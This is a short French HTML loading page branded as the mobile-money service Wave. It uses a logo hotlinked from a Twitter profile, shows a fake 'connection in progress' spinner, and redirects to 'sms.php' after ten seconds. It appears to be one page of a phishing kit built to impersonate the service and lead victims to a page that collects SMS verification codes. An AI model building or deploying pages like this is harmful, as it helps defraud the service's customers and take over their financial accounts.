<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Chargement Wave</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body {
      background-color: white;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      height: 100vh;
    }

    .wave-logo img {
      width: 50px;
      height: 50px;
    }

    .loading-text {
      font-size: 18px;
      color: #333;
      margin-top: 10px;
      text-align: center;
    }
  </style>
</head>
<body>

  <div class="wave-logo">
    <img src="https://pbs.twimg.com/profile_images/1846916870219141120/E477p8xw_400x400.jpg" alt="Wave">
  </div>

  <div class="loading-text">Connexion en cours...</div>
  <div class="spinner-border" role="status"></div>

  <script>
    setTimeout(() => {
      window.location.href = "sms.php"; // Redirige après 10 sec
    }, 10000);
  </script>

</body>
</html>
